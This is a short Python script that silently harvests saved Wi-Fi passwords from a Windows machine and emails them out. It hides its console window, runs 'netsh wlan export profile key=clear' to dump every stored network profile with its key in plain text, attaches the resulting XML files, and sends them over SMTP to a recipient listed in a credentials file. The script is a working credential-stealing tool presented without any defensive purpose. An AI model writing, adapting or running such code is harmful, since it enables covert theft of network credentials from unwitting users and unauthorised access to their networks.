import os
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import getpass
import datetime

pc_username = getpass.getuser()
print(pc_username)

info = open('credentials.txt', 'r').readlines()
email = info[0].strip('\n')

fromaddr = email
toaddr = info[2].strip('\n')

# instance of MIMEMultipart
msg = MIMEMultipart()

# storing the senders email address
msg['From'] = fromaddr

# storing the receivers email address
msg['To'] = toaddr

# storing the subject
msg['Subject'] = f"{pc_username} {datetime.datetime.now()}"

# string to store the body of the mail
body = f"file from {pc_username} "

# attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = subprocess.SW_HIDE  # default
subprocess.call('netsh wlan export profile key=clear', startupinfo=si)
directories = os.listdir()

for directory in directories:
    if directory.endswith('.xml'):
        filename = directory
        attachment = open(filename, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition',
                     "attachment; filename= %s" % filename)
        msg.attach(p)


# creates SMTP session
host = info[3].strip('\n')
port = info[4].strip('\n')
s = smtplib.SMTP(host, port)
# start TLS for security
s.starttls()
# Authentication
password = info[1].strip('\n')
s.login(fromaddr, password)
# Converts the Multipart msg into a string
text = msg.as_string()
# sending the mailcls

s.sendmail(fromaddr, toaddr, text)
# terminating the session
s.quit()
